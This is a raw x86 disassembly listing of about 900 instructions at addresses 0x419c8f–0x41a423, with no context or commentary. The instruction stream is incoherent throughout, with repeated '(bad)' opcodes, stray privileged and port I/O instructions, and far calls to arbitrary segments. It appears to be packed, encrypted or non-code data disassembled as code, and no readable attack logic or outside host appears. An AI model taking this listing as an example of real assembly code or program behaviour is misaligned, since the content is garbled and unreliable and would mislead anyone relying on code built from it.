  419c8f:	pusha  
  419c90:	mov    ebp,0xba65636e
  419c95:	js     0x419c93
  419c97:	jbe    0x419ce9
  419c99:	addr16 jae 0x419c4e
  419c9c:	ins    DWORD PTR es:[edi],dx
  419c9d:	adc    al,0xeb
  419c9f:	in     eax,0xe5
  419ca1:	cmc    
  419ca2:	test   eax,0x61974306
  419ca7:	push   0x2e
  419ca9:	mov    esp,0xe860fa10
  419cae:	mov    ds:0x67376db6,eax
  419cb3:	xchg   esp,eax
  419cb4:	leave  
  419cb5:	xor    al,0xed
  419cb7:	ins    DWORD PTR es:[edi],dx
  419cb8:	outs   dx,DWORD PTR ds:[esi]
  419cb9:	out    dx,eax
  419cba:	adc    DWORD PTR [edx],esp
  419cbc:	ins    BYTE PTR es:[edi],dx
  419cbd:	cmp    esi,DWORD PTR ds:0x54846131
  419cc3:	mov    ecx,0xa9286aef
  419cc8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cca:	and    DWORD PTR [ebp-0x6b],ecx
  419ccd:	aas    
  419cce:	jo     0x419d43
  419cd0:	and    al,0x55
  419cd2:	mov    al,0x9f
  419cd4:	sub    al,0x49
  419cd6:	mov    eax,ds:0x43595181
  419cdb:	mov    ecx,0x3d9bcb9d
  419ce0:	jg     0x419d54
  419ce2:	xor    bp,dx
  419ce5:	or     BYTE PTR [ebp+0x703895cc],dl
  419ceb:	(bad)  
  419cec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ced:	lea    eax,[eax-0x6c]
  419cf0:	and    ecx,DWORD PTR es:[edx+0x75]
  419cf4:	lock pop edx
  419cf6:	mov    ecx,0xf7c637ee
  419cfb:	call   0xa397b7c2
  419d00:	fwait
  419d01:	shl    DWORD PTR [edx-0x60dfae7b],1
  419d07:	test   DWORD PTR [ebp-0x1ca23b0b],eax
  419d0d:	pop    ecx
  419d0e:	push   ebx
  419d0f:	push   ebx
  419d10:	mov    bh,0x57
  419d12:	xchg   esp,eax
  419d13:	jmp    DWORD PTR [ebp+0x5b05d8c]
  419d19:	scas   al,BYTE PTR es:[edi]
  419d1a:	sub    al,0xa6
  419d1c:	imul   esi,DWORD PTR [edx+0x16],0xc4f40e7d
  419d23:	jb     0x419d2e
  419d25:	(bad)  
  419d26:	push   edi
  419d27:	push   edx
  419d28:	cli    
  419d29:	dec    ebp
  419d2a:	adc    BYTE PTR [edx-0x6e20f36e],bl
  419d30:	adc    al,0xfe
  419d32:	call   0x87e4:0x77405bd7
  419d39:	or     DWORD PTR [esi+0x33],ebp
  419d3c:	xor    BYTE PTR [eax],dh
  419d3e:	and    eax,0x62933f48
  419d43:	inc    esp
  419d44:	iret   
  419d45:	popf   
  419d46:	neg    BYTE PTR [edx]
  419d48:	ret    0xc510
  419d4b:	sbb    DWORD PTR [ebx],edi
  419d4d:	sar    BYTE PTR [ecx],1
  419d4f:	cmp    dh,cl
  419d51:	sahf   
  419d52:	mov    fs:0x3e7473f3,al
  419d58:	in     eax,0xfb
  419d5a:	and    BYTE PTR [edx-0xee44892],dl
  419d60:	sub    dl,dh
  419d62:	cld    
  419d63:	xchg   edi,eax
  419d64:	sub    ecx,DWORD PTR [edi+0x3d98fea9]
  419d6a:	mov    ds:0xb549bc00,eax
  419d6f:	(bad)  
  419d70:	shl    dl,0xa2
  419d73:	mov    dl,0x31
  419d75:	gs ins DWORD PTR es:[edi],dx
  419d77:	or     dl,BYTE PTR [esi-0x5f8b32a5]
  419d7d:	pop    eax
  419d7e:	mov    esp,0xc011e84a
  419d83:	dec    esi
  419d84:	fs ret 0x22f3
  419d88:	in     al,0xb
  419d8a:	(bad)  
  419d8b:	sbb    BYTE PTR [esp+ebp*1-0x58],bh
  419d8f:	dec    edi
  419d90:	daa    
  419d91:	and    DWORD PTR [esp+0x39],edi
  419d95:	mov    dl,0x17
  419d97:	cwde   
  419d98:	adc    dh,dh
  419d9a:	or     DWORD PTR [ecx+ebx*1+0x64],ebp
  419d9e:	cmp    DWORD PTR [ebx-0x62],ebp
  419da1:	pop    ecx
  419da2:	stos   BYTE PTR es:[edi],al
  419da3:	mov    esi,0xe4e7b4ff
  419da8:	cs jae 0x419d41
  419dab:	repz (bad) 
  419dae:	pusha  
  419daf:	jg     0x419d62
  419db1:	in     eax,dx
  419db2:	(bad)  
  419db3:	cmp    BYTE PTR [ecx-0xdbb89b3],bh
  419db9:	outs   dx,BYTE PTR ds:[esi]
  419dba:	imul   ebx,DWORD PTR ds:0x6009ba3a,0x11158ca4
  419dc4:	out    dx,al
  419dc5:	adc    al,0x95
  419dc7:	rcl    ebp,cl
  419dc9:	jo     0x419e1a
  419dcb:	and    BYTE PTR [ecx-0x57],bh
  419dce:	ss jnp 0x419daf
  419dd1:	and    al,0x7c
  419dd3:	mov    ch,0xa8
  419dd5:	imul   eax,DWORD PTR [ecx+0x6db362ef],0x17
  419ddc:	scas   al,BYTE PTR es:[edi]
  419ddd:	shr    DWORD PTR [edi],cl
  419ddf:	outs   dx,BYTE PTR ds:[esi]
  419de0:	xchg   esi,eax
  419de1:	sub    edx,DWORD PTR [eax]
  419de3:	not    DWORD PTR [ebp+edi*2-0x2b]
  419de7:	ds out dx,al
  419de9:	jmp    0x69b7:0x1c893431
  419df0:	shl    DWORD PTR [esi-0x7d],0xf0
  419df4:	enter  0x8977,0x28
  419df8:	(bad)  
  419dfa:	jecxz  0x419e08
  419dfc:	jno    0x419dfe
  419dfe:	adc    esi,DWORD PTR [edx]
  419e00:	iret   
  419e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e02:	fistp  QWORD PTR [ebp+0x69]
  419e05:	shr    eax,0x6b
  419e08:	inc    esi
  419e09:	pop    ss
  419e0a:	add    al,0x18
  419e0c:	dec    esp
  419e0d:	xlat   BYTE PTR ds:[ebx]
  419e0e:	and    BYTE PTR [ebx-0x553517e1],0x8a
  419e15:	xor    cl,BYTE PTR [ebp-0x31]
  419e18:	dec    edi
  419e19:	pop    ss
  419e1a:	or     edx,DWORD PTR [esi-0x4e]
  419e1d:	imul   esp,edx,0xffffffc2
  419e20:	xchg   ebp,eax
  419e21:	adc    al,0x56
  419e23:	xchg   edi,eax
  419e24:	inc    DWORD PTR [esi]
  419e26:	into   
  419e27:	mov    ah,0x7f
  419e29:	or     edx,ebx
  419e2b:	ins    BYTE PTR es:[edi],dx
  419e2c:	dec    edx
  419e2d:	ins    BYTE PTR es:[edi],dx
  419e2e:	outs   dx,DWORD PTR ds:[esi]
  419e2f:	mov    BYTE PTR [ecx],cl
  419e31:	cwde   
  419e32:	sbb    DWORD PTR ds:0xb288e938,ebx
  419e38:	aad    0xb
  419e3a:	cld    
  419e3b:	jle    0x419ddf
  419e3d:	jno    0x419dd7
  419e3f:	jo     0x419e3c
  419e41:	sub    al,0x75
  419e43:	mov    BYTE PTR [ebx],ah
  419e45:	xchg   esp,eax
  419e46:	add    al,0x88
  419e48:	out    dx,al
  419e49:	xchg   esi,eax
  419e4a:	add    eax,0x164e3323
  419e4f:	stc    
  419e50:	pop    edx
  419e51:	add    BYTE PTR ss:[ebx],al
  419e54:	test   al,0x6d
  419e56:	and    esp,DWORD PTR [eax]
  419e58:	popa   
  419e59:	jmp    0xc38c3866
  419e5e:	jne    0x419ed2
  419e60:	test   al,0x3
  419e62:	test   DWORD PTR [edx-0x5ef3da7c],edi
  419e68:	imul   esp,DWORD PTR ds:0xd9356e7a,0x3e333cf
  419e72:	(bad)  
  419e73:	fcomp  st(1)
  419e75:	mov    bl,0x9c
  419e77:	cwde   
  419e78:	int3   
  419e79:	push   edx
  419e7a:	adc    dl,cl
  419e7c:	or     ebx,0xffffffd9
  419e7f:	loope  0x419eb2
  419e81:	sub    BYTE PTR ds:0xadbb8a74,0xa3
  419e88:	inc    ebx
  419e89:	lods   al,BYTE PTR ds:[esi]
  419e8a:	cmp    DWORD PTR [esi+ebp*2-0x72],ebx
  419e8e:	scas   eax,DWORD PTR es:[edi]
  419e8f:	mov    bh,0xe
  419e91:	test   al,0x21
  419e93:	xchg   BYTE PTR [ecx],ch
  419e95:	sub    eax,0x484ff6c5
  419e9a:	call   0xdaa80122
  419e9f:	cmp    al,0x37
  419ea1:	adc    DWORD PTR [esi],esp
  419ea3:	ret    0x8227
  419ea6:	jno    0x419e6f
  419ea8:	push   esp
  419ea9:	aad    0x1b
  419eab:	sbb    eax,0x215fab0b
  419eb0:	pop    edx
  419eb1:	ins    DWORD PTR es:[edi],dx
  419eb2:	xchg   ebx,eax
  419eb3:	xchg   edi,eax
  419eb4:	loopne 0x419ebd
  419eb6:	cmp    BYTE PTR [edi],ch
  419eb8:	fsub   QWORD PTR [edx]
  419eba:	repz fcom DWORD PTR [esp+esi*8-0x6e]
  419ebf:	sbb    edi,0x2533f067
  419ec5:	cld    
  419ec6:	in     eax,0x66
  419ec8:	mov    eax,ds:0xb63e4e43
  419ecd:	iret   
  419ece:	dec    ecx
  419ecf:	int    0x88
  419ed1:	fist   DWORD PTR [edx]
  419ed3:	fdivr  DWORD PTR [ebp-0x6020025e]
  419ed9:	in     eax,dx
  419eda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419edc:	or     BYTE PTR [ecx-0x1c],dl
  419edf:	repnz (bad) 
  419ee1:	ror    dl,1
  419ee3:	outs   dx,BYTE PTR ds:[esi]
  419ee4:	fwait
  419ee5:	sar    ah,cl
  419ee7:	mov    edx,0xefea3cd9
  419eec:	xchg   esp,eax
  419eed:	fcomip st,st(1)
  419eef:	outs   dx,BYTE PTR ds:[esi]
  419ef0:	mov    ds:0xefbdc15a,eax
  419ef5:	sub    eax,0x6a3fa28f
  419efa:	std    
  419efb:	call   0x235e:0x7393d63
  419f02:	call   0x91db:0xa0a795a3
  419f09:	xor    DWORD PTR [esi-0x20],eax
  419f0c:	or     eax,0x1c9fb479
  419f11:	mov    al,ds:0x78ebd738
  419f16:	push   esi
  419f17:	pop    ecx
  419f19:	(bad)  
  419f1b:	jb     0x419f62
  419f1d:	rol    dh,cl
  419f1f:	cmp    BYTE PTR [edx+0x25],dl
  419f22:	ror    DWORD PTR [edx],cl
  419f24:	sti    
  419f25:	in     eax,dx
  419f26:	test   DWORD PTR [ecx-0x1d],ebp
  419f29:	cmp    ecx,edi
  419f2b:	mov    ds:0xd0620e2e,eax
  419f30:	add    DWORD PTR [esi+0x469a19c0],ebp
  419f36:	pop    esp
  419f37:	or     ebp,0xa7161fcf
  419f3d:	aaa    
  419f3e:	mov    bl,0x44
  419f40:	mov    ecx,0xbe126415
  419f45:	fidiv  WORD PTR [esi]
  419f47:	daa    
  419f48:	shl    DWORD PTR [edx],1
  419f4a:	mov    ds:0xfb9d6eb9,eax
  419f4f:	xlat   BYTE PTR ds:[ebx]
  419f51:	aam    0xac
  419f53:	push   ebx
  419f54:	xor    BYTE PTR [ebx],0x28
  419f57:	mov    eax,ds:0x5d884f8
  419f5c:	mov    al,ds:0x64001e31
  419f61:	sahf   
  419f62:	mov    ch,BYTE PTR [ecx-0x61539734]
  419f68:	pop    edi
  419f69:	jns    0x419fae
  419f6b:	fisttp WORD PTR [esi]
  419f6d:	mov    eax,0x17cb68cf
  419f72:	stos   BYTE PTR es:[edi],al
  419f73:	test   BYTE PTR [edi-0x23],0xfa
  419f77:	xor    DWORD PTR [edx-0x76],esi
  419f7a:	test   BYTE PTR [esi],0xef
  419f7d:	div    BYTE PTR [edi]
  419f7f:	lods   al,BYTE PTR ds:[esi]
  419f80:	cmp    edx,DWORD PTR [ecx]
  419f82:	ret    
  419f83:	stos   DWORD PTR es:[edi],eax
  419f84:	mov    esp,0x7180cf04
  419f89:	or     edi,esp
  419f8b:	fstp   DWORD PTR [ebp+ebp*2+0x46]
  419f8f:	push   es
  419f90:	idiv   BYTE PTR [eax]
  419f92:	test   al,0x46
  419f94:	cmc    
  419f95:	out    dx,al
  419f96:	and    al,0x4c
  419f98:	mov    dl,0xb
  419f9a:	jb     0x419fed
  419f9c:	inc    esp
  419f9d:	fild   DWORD PTR [ecx]
  419f9f:	repz sbb al,0xf5
  419fa2:	(bad)  [ecx-0x30d85f1f]
  419fa8:	or     DWORD PTR [ecx+0x3a],ecx
  419fab:	sbb    ebx,DWORD PTR [eax-0x30cefcdb]
  419fb1:	popf   
  419fb2:	inc    edi
  419fb3:	shl    BYTE PTR [eax],cl
  419fb5:	inc    ebx
  419fb6:	dec    eax
  419fb7:	mov    DWORD PTR [eax-0x4e810d8e],ebx
  419fbd:	jl     0x419f9c
  419fbf:	out    dx,al
  419fc0:	lea    edx,[ecx-0x46f62c5]
  419fc6:	lahf   
  419fc7:	xchg   ebp,eax
  419fc8:	xor    cl,BYTE PTR [eax]
  419fca:	les    edx,FWORD PTR [ebp-0x7a43c9]
  419fd0:	jnp    0x419f8d
  419fd2:	push   ebx
  419fd3:	daa    
  419fd4:	nop
  419fd5:	and    eax,0xac481cf6
  419fda:	cmp    eax,0x5af2f1fe
  419fdf:	ret    
  419fe0:	mov    cl,BYTE PTR [edi-0x31]
  419fe3:	xchg   edx,eax
  419fe4:	lock xor ebx,eax
  419fe7:	or     eax,0x2d357108
  419fec:	mov    ch,0xbd
  419fee:	ins    DWORD PTR es:[edi],dx
  419fef:	cmp    DWORD PTR [ebp-0x4a6dce2a],0x6
  419ff6:	pop    ecx
  419ff7:	sub    al,0x31
  419ff9:	cwde   
  419ffa:	mov    ah,0xe8
  419ffc:	pop    ecx
  419ffd:	arpl   WORD PTR [ebp+edx*8+0x15],sp
  41a001:	mov    bh,0xb5
  41a003:	retf   
  41a004:	sub    eax,0xda0da175
  41a009:	or     ch,BYTE PTR [ecx+0x3480ab4f]
  41a00f:	and    BYTE PTR [ecx+eax*2],ch
  41a012:	jbe    0x419fa4
  41a014:	pop    ebp
  41a015:	(bad)  
  41a016:	mov    ebx,0x4d0cc623
  41a01b:	je     0x419feb
  41a01d:	out    0xa5,eax
  41a01f:	rcr    DWORD PTR [edi+0x599d86cf],0x5e
  41a026:	cli    
  41a027:	ficom  WORD PTR [esi+0x2a]
  41a02a:	ds inc esi
  41a02c:	inc    ebp
  41a02d:	inc    ebx
  41a02e:	jecxz  0x41a04e
  41a030:	adc    DWORD PTR [eax-0x5d90bb69],esp
  41a036:	jmp    0xd9bf:0x4b261c8e
  41a03d:	add    eax,0x60646ec8
  41a042:	push   esp
  41a043:	adc    al,0xe2
  41a045:	hlt    
  41a046:	add    DWORD PTR [ebp+0x53],esp
  41a049:	rcr    BYTE PTR ds:0xb7f37b17,1
  41a04f:	pop    edi
  41a050:	jecxz  0x41a0b1
  41a052:	pop    ebx
  41a053:	xor    BYTE PTR [ebx+edx*1-0x4f],dh
  41a057:	adc    al,0xec
  41a059:	push   eax
  41a05a:	jp     0x41a093
  41a05c:	xor    ebp,DWORD PTR [eax-0x9]
  41a05f:	das    
  41a060:	in     eax,dx
  41a061:	mov    esi,DWORD PTR [edx]
  41a063:	and    BYTE PTR [ebp+0x3f75aa89],dh
  41a069:	or     al,0x6d
  41a06b:	push   cs
  41a06c:	(bad)  
  41a06d:	or     DWORD PTR [esi-0x2c],edi
  41a070:	fidivr DWORD PTR [bx+si]
  41a073:	push   cs
  41a074:	xchg   edi,eax
  41a075:	and    edi,DWORD PTR [esi+0x59012d3f]
  41a07b:	and    eax,0x6381413
  41a080:	cli    
  41a081:	push   cs
  41a082:	aas    
  41a083:	xchg   esp,eax
  41a084:	out    0x4d,eax
  41a086:	pop    ds
  41a087:	out    dx,eax
  41a088:	push   esp
  41a089:	in     eax,dx
  41a08a:	push   ss
  41a08b:	out    0xf1,eax
  41a08d:	cdq    
  41a08e:	rcl    BYTE PTR [ebx+ecx*4],cl
  41a091:	pushf  
  41a092:	retf   
  41a093:	dec    edi
  41a094:	sub    ecx,edx
  41a096:	ins    BYTE PTR es:[edi],dx
  41a097:	in     eax,dx
  41a098:	push   ebx
  41a099:	lods   eax,DWORD PTR ds:[esi]
  41a09a:	sbb    BYTE PTR [eax+0x4cedf7d1],bh
  41a0a0:	adc    DWORD PTR [ebx-0x58b19066],esi
  41a0a6:	popf   
  41a0a7:	(bad)  
  41a0a8:	inc    DWORD PTR [eax-0x4728352d]
  41a0ae:	mov    ebx,0x76e535f8
  41a0b3:	mov    ebx,0x9460ed2a
  41a0b8:	(bad)  
  41a0b9:	hlt    
  41a0ba:	in     al,dx
  41a0bb:	or     BYTE PTR ds:0xb793004c,cl
  41a0c1:	xor    eax,0x3cd79ef3
  41a0c6:	loopne 0x41a0ce
  41a0c8:	fnstenv [ecx]
  41a0ca:	mov    DWORD PTR [esi],eax
  41a0cc:	jmp    0x41a0eb
  41a0ce:	dec    ebp
  41a0cf:	pop    ss
  41a0d0:	fild   WORD PTR [edi-0x21f4306a]
  41a0d6:	mov    ebp,0xa7523e6f
  41a0db:	cmp    DWORD PTR [edx+0x180dfea2],ebp
  41a0e1:	sbb    eax,0x2e35b559
  41a0e6:	inc    ebx
  41a0e7:	mov    al,0x23
  41a0e9:	and    eax,0xdb210e13
  41a0ee:	cmp    esi,DWORD PTR [edx+0x3d75e2ce]
  41a0f4:	sti    
  41a0f5:	push   es
  41a0f6:	pop    edx
  41a0f7:	sub    BYTE PTR [eax+0x3e1d3075],bh
  41a0fd:	call   0x61f0:0x707445a8
  41a104:	adc    dl,dh
  41a106:	pop    ecx
  41a107:	cmp    DWORD PTR [esi+0x95d3fbb],edx
  41a10d:	jge    0x41a0f1
  41a10f:	add    BYTE PTR [edx],ah
  41a111:	jmp    FWORD PTR [edi]
  41a113:	clc    
  41a114:	pop    edx
  41a115:	add    al,0x43
  41a117:	push   ss
  41a118:	iret   
  41a119:	(bad)  
  41a11a:	je     0x41a148
  41a11c:	dec    ebp
  41a11d:	adc    BYTE PTR [esp+eiz*8+0x6a1aeb06],bl
  41a124:	stos   BYTE PTR es:[edi],al
  41a125:	sbb    ch,BYTE PTR [edx-0x8005cff]
  41a12b:	imul   eax,ebp,0xffffff93
  41a12e:	jo     0x41a0d1
  41a130:	xchg   esp,eax
  41a131:	xor    DWORD PTR [edx],ecx
  41a133:	mov    ah,BYTE PTR [ebp-0x7b021731]
  41a139:	stc    
  41a13a:	stos   DWORD PTR es:[edi],eax
  41a13b:	mov    edi,0xb7eda27e
  41a140:	or     DWORD PTR [ecx+0x358267d7],edi
  41a146:	sub    eax,0x7e863bf3
  41a14b:	push   ds
  41a14c:	out    0x5d,al
  41a14e:	daa    
  41a14f:	sbb    al,0xc4
  41a151:	lds    ebx,FWORD PTR [ecx-0x1414ec5c]
  41a157:	in     al,0x40
  41a159:	pop    ds
  41a15a:	xchg   esi,eax
  41a15b:	fidiv  WORD PTR [esi]
  41a15d:	push   si
  41a15f:	dec    ebx
  41a160:	addr16 sub ebp,eax
  41a163:	mov    dh,0xae
  41a165:	pop    es
  41a166:	test   eax,0x7cd96dd9
  41a16b:	ror    BYTE PTR [esi-0x59f2fd10],cl
  41a171:	test   BYTE PTR [edi+0x48],bl
  41a174:	pop    ebx
  41a175:	out    dx,eax
  41a176:	sar    esi,cl
  41a178:	fwait
  41a179:	verr   sp
  41a17c:	sub    eax,DWORD PTR [edx+0x6e6d0754]
  41a182:	push   edx
  41a183:	adc    al,0x4b
  41a185:	arpl   WORD PTR ds:0xb22f2849,dx
  41a18b:	push   ecx
  41a18c:	inc    ebx
  41a18d:	idiv   edx
  41a18f:	and    eax,0x8e58e0f3
  41a194:	popa   
  41a195:	or     DWORD PTR [esi],esi
  41a197:	icebp  
  41a198:	test   eax,0x78d74394
  41a19d:	adc    edi,DWORD PTR [ecx+0x1f]
  41a1a0:	int3   
  41a1a1:	dec    esp
  41a1a2:	mov    dh,0xd9
  41a1a4:	ja     0x41a1a4
  41a1a6:	lea    esi,[edx-0x5b7a6d4d]
  41a1ac:	xchg   edx,eax
  41a1ad:	xchg   edi,eax
  41a1ae:	or     BYTE PTR [edx+0x3c65e9b2],0xa
  41a1b5:	shl    BYTE PTR [ebx+0x3a],cl
  41a1b8:	jp     0x41a16c
  41a1ba:	jo     0x41a1a9
  41a1bc:	adc    eax,0xb2de7c5d
  41a1c1:	inc    esi
  41a1c2:	(bad)  
  41a1c3:	fdivp  st(1),st
  41a1c5:	stos   BYTE PTR es:[edi],al
  41a1c6:	xchg   DWORD PTR [eax-0xa],edx
  41a1c9:	pop    ebp
  41a1ca:	pop    edx
  41a1cb:	or     ecx,DWORD PTR [ebp-0x63ae162e]
  41a1d1:	lock rcr DWORD PTR [esi+0x1cff779e],cl
  41a1d8:	das    
  41a1d9:	jmp    DWORD PTR [edi+eax*1]
  41a1dc:	lds    eax,FWORD PTR [ebp+0x1106dda0]
  41a1e2:	popf   
  41a1e3:	xor    DWORD PTR [eax],edx
  41a1e5:	popf   
  41a1e6:	lods   eax,DWORD PTR ds:[esi]
  41a1e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1e8:	retf   
  41a1e9:	int3   
  41a1ea:	jge    0x41a19f
  41a1ec:	loopne 0x41a1a0
  41a1ee:	xchg   edx,edx
  41a1f0:	sub    al,0x13
  41a1f2:	aam    0x71
  41a1f4:	mov    ecx,0xbfd8c54e
  41a1f9:	stc    
  41a1fa:	out    0x9e,al
  41a1fc:	ror    BYTE PTR [esp+edi*8],0x4c
  41a200:	jbe    0x41a21a
  41a202:	ja     0x41a19d
  41a204:	data16 stos BYTE PTR es:[edi],al
  41a206:	and    bl,BYTE PTR [edx+0x19168400]
  41a20c:	push   edx
  41a20d:	imul   eax,DWORD PTR [ecx],0x1be01d18
  41a213:	dec    ebp
  41a214:	sub    edx,DWORD PTR [ebp+0x38]
  41a217:	scas   al,BYTE PTR es:[edi]
  41a218:	xor    edx,esp
  41a21a:	cmp    ecx,DWORD PTR [ebx+0x8]
  41a21d:	and    al,0xf2
  41a21f:	leave  
  41a220:	in     al,0x24
  41a222:	dec    edx
  41a223:	sub    bh,BYTE PTR [ecx+ebp*4+0x22a1caf6]
  41a22a:	xor    DWORD PTR [eax-0x4c],ecx
  41a22d:	fwait
  41a22e:	mov    ch,0x53
  41a230:	push   0x3fb9b2fd
  41a235:	sub    bl,BYTE PTR [eax+0x24dd8fed]
  41a23b:	scas   al,BYTE PTR es:[edi]
  41a23c:	xor    esp,ecx
  41a23e:	push   es
  41a23f:	mov    dl,0x82
  41a241:	ret    0x8cda
  41a244:	aam    0xc6
  41a246:	mov    edx,0xaf03c5cc
  41a24b:	push   ebp
  41a24c:	inc    ebp
  41a24d:	jp     0x41a26c
  41a24f:	xor    edi,esp
  41a251:	les    ebp,FWORD PTR ds:0x292a4683
  41a257:	mov    dh,0xb0
  41a259:	ret    0x9e5c
  41a25c:	push   cs
  41a25d:	std    
  41a25e:	and    esi,DWORD PTR [ecx]
  41a260:	jb     0x41a23e
  41a262:	and    eax,0xd1bca70f
  41a267:	xor    eax,0xf40085af
  41a26c:	pop    esp
  41a26d:	pop    edi
  41a26e:	mov    eax,ds:0xe3c140b9
  41a273:	les    edx,FWORD PTR [edi]
  41a275:	in     eax,dx
  41a276:	mov    eax,ds:0xb799ba09
  41a27b:	cmp    cl,BYTE PTR [esi-0x1dcedd11]
  41a281:	mov    ah,BYTE PTR [edi-0x15]
  41a284:	push   ebx
  41a285:	pop    esp
  41a286:	addr16 in al,0xe1
  41a289:	mov    cl,0xf6
  41a28b:	adc    DWORD PTR [ecx+eax*4-0x53],eax
  41a28f:	fsubr  DWORD PTR [edx+0xe01d0d9]
  41a295:	mov    esi,0x16afb137
  41a29a:	xor    eax,0xfdf79a10
  41a29f:	mov    al,BYTE PTR [eax-0xa]
  41a2a2:	retf   0x6cbf
  41a2a5:	sub    edx,DWORD PTR [edx+0x2668998c]
  41a2ab:	aad    0x1a
  41a2ad:	jmp    0xd4ce4afc
  41a2b2:	imul   eax,DWORD PTR [edx+0x4f],0xffffff82
  41a2b6:	jle    0x41a285
  41a2b8:	fistp  DWORD PTR [eax]
  41a2ba:	sub    al,0x2a
  41a2bc:	mov    dh,0x25
  41a2be:	in     al,dx
  41a2bf:	mov    eax,0xe3a6f10c
  41a2c4:	retf   0xa18f
  41a2c7:	cmc    
  41a2c8:	hlt    
  41a2c9:	test   ah,bl
  41a2cb:	daa    
  41a2cc:	gs scas al,BYTE PTR es:[edi]
  41a2ce:	pop    esi
  41a2cf:	out    dx,al
  41a2d0:	jp     0x41a32a
  41a2d2:	imul   ecx,DWORD PTR [ebx+0x6c],0xffffff97
  41a2d6:	jo     0x41a263
  41a2d8:	(bad)  
  41a2d9:	ror    DWORD PTR [ebx+0x6eb01bf4],cl
  41a2df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2e0:	inc    ecx
  41a2e1:	lea    edi,[esi-0x78]
  41a2e4:	enter  0xbf7a,0x74
  41a2e8:	xlat   BYTE PTR ds:[ebx]
  41a2e9:	mov    ebx,0xec4d2c13
  41a2ee:	inc    esp
  41a2ef:	pop    edx
  41a2f0:	cmp    DWORD PTR [edx-0x5],ecx
  41a2f3:	les    eax,FWORD PTR [ebx]
  41a2f5:	leave  
  41a2f6:	es mov esp,0x559aba89
  41a2fc:	xchg   esi,eax
  41a2fd:	inc    ebx
  41a2fe:	push   0x7735bb51
  41a303:	scas   al,BYTE PTR es:[edi]
  41a304:	sub    BYTE PTR cs:[edx],ah
  41a307:	imul   edi,DWORD PTR [ecx],0x4a
  41a30a:	xlat   BYTE PTR ds:[ebx]
  41a30b:	xchg   ebp,eax
  41a30c:	jo     0x41a37b
  41a30e:	push   ecx
  41a30f:	icebp  
  41a310:	dec    edx
  41a311:	cmp    BYTE PTR [esi+0x3edee3ff],ch
  41a317:	mov    eax,0x97a6c79e
  41a31c:	mov    esp,0x7700471b
  41a321:	ret    
  41a322:	mov    bl,0x38
  41a324:	lods   eax,DWORD PTR ds:[esi]
  41a325:	jp     0x41a2b4
  41a327:	adc    dl,BYTE PTR [ebp-0x41c15d63]
  41a32d:	test   DWORD PTR [eax+0x6a48d235],0x98e11e1e
  41a337:	in     eax,dx
  41a338:	jbe    0x41a2d8
  41a33a:	xchg   ecx,eax
  41a33b:	and    ebx,ebp
  41a33d:	pop    ecx
  41a33e:	or     eax,DWORD PTR [edi-0x32529cd9]
  41a344:	out    0x21,al
  41a346:	inc    eax
  41a347:	sti    
  41a348:	mov    WORD PTR [eax],es
  41a34a:	(bad)  
  41a34b:	push   ebp
  41a34c:	enter  0x11ff,0xda
  41a350:	fnstsw WORD PTR [edx+ebp*4+0x4f]
  41a354:	loopne 0x41a347
  41a356:	jno    0x41a366
  41a358:	out    dx,eax
  41a359:	push   edx
  41a35a:	cmp    al,0xec
  41a35c:	dec    edi
  41a35d:	shl    BYTE PTR [ecx],cl
  41a35f:	pusha  
  41a360:	cmp    dh,dh
  41a362:	retf   0x9f42
  41a365:	xchg   esp,eax
  41a366:	scas   eax,DWORD PTR es:[edi]
  41a367:	mov    al,bl
  41a369:	(bad)  
  41a36a:	sbb    eax,0x5b5e9267
  41a36f:	mov    eax,ds:0xa466a1e0
  41a374:	rcr    BYTE PTR [esi+0x435e133e],1
  41a37a:	mov    cl,0x7
  41a37c:	dec    ebp
  41a37d:	cld    
  41a37e:	(bad)  [esi]
  41a380:	pop    ebx
  41a381:	test   al,0x79
  41a383:	pop    ecx
  41a384:	ds pushf 
  41a386:	(bad)  
  41a388:	jae    0x41a3f5
  41a38a:	mov    eax,0xfe3f772c
  41a38f:	popa   
  41a390:	lahf   
  41a391:	jnp    0x41a3ae
  41a393:	mov    al,0x11
  41a395:	cli    
  41a396:	int    0x5c
  41a398:	adc    ah,ah
  41a39a:	mov    ah,0x64
  41a39c:	es cld 
  41a39e:	fwait
  41a39f:	sbb    BYTE PTR ds:0x1865a8b5,dl
  41a3a5:	xchg   DWORD PTR gs:[esi],ebp
  41a3a8:	sub    esp,ebx
  41a3aa:	pop    ds
  41a3ab:	dec    esi
  41a3ac:	imul   esp,DWORD PTR [ebx-0x32],0xa6a53dd5
  41a3b3:	push   ss
  41a3b4:	jnp    0x41a368
  41a3b6:	ret    0xf276
  41a3b9:	out    0x8c,eax
  41a3bb:	fsubr  QWORD PTR [edx+0x1]
  41a3be:	aaa    
  41a3bf:	and    al,0x11
  41a3c1:	pop    ebx
  41a3c2:	jge    0x41a384
  41a3c4:	jnp    0x41a3e5
  41a3c6:	fnstenv [ecx+0x13]
  41a3c9:	mov    bh,0xc3
  41a3cb:	mov    DWORD PTR [edx+0x477f84a3],ebp
  41a3d1:	pop    esi
  41a3d2:	clc    
  41a3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3d4:	pop    esp
  41a3d5:	bound  esp,QWORD PTR [esi-0x78f7e8bb]
  41a3db:	mov    edi,0xd195730c
  41a3e0:	mov    ebp,0xede3ed92
  41a3e5:	cld    
  41a3e6:	scas   al,BYTE PTR es:[di]
  41a3e8:	push   0x64748417
  41a3ed:	adc    DWORD PTR [edx+esi*1+0x7016e80c],ebp
  41a3f4:	scas   al,BYTE PTR es:[edi]
  41a3f5:	or     eax,edi
  41a3f7:	test   DWORD PTR [esi],0x9ba34650
  41a3fd:	push   ss
  41a3fe:	out    0x5f,eax
  41a400:	push   esp
  41a401:	mov    edx,0xe18ce65f
  41a406:	es xchg esi,eax
  41a408:	xor    esp,DWORD PTR [edx-0x46]
  41a40b:	cmp    al,0xc4
  41a40d:	push   eax
  41a40e:	mov    edi,0x800dd6c0
  41a413:	xchg   esp,eax
  41a414:	mov    al,ds:0xc784ec1a
  41a419:	ins    BYTE PTR es:[edi],dx
  41a41a:	cld    
  41a41b:	aad    0xe2
  41a41d:	push   esi
  41a41e:	xor    al,0x2
  41a420:	or     ebx,DWORD PTR [ebx+0x43]
  41a423:	sbb    al,0x7d
